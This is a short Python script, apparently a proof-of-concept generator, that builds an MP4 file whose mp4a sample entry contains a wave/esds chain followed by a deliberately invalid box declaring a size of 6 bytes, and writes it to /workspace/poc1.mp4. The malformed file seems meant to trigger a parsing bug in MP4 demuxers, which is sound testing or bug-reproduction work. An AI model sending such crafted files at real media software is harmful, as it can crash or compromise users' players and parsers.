import struct

def box(t,p=b''):
    return struct.pack('>I4s', 8+len(p), t.encode())+p

def fullbox(t,p=b'', v=0, flags=0):
    return box(t, bytes([v])+flags.to_bytes(3,'big')+p)

esds = fullbox('esds')
wave = box('wave', esds)
invalid = struct.pack('>I4s', 6, b'bad!')
mp4a_payload = b'\0'*6 + struct.pack('>H',1) + struct.pack('>HHIHHHHHH',0,0,0,2,16,0,0,44100,0) + wave + invalid
mp4a = box('mp4a', mp4a_payload)
stsd = fullbox('stsd', struct.pack('>I',1)+mp4a)
stbl = box('stbl', stsd)
minf = box('minf', stbl)
mdia = box('mdia', minf)
trak = box('trak', mdia)
moov = box('moov', trak)
ftyp = box('ftyp', b'isom\0\0\0\1isom')
open('/workspace/poc1.mp4','wb').write(ftyp+moov)
print(len(ftyp+moov))
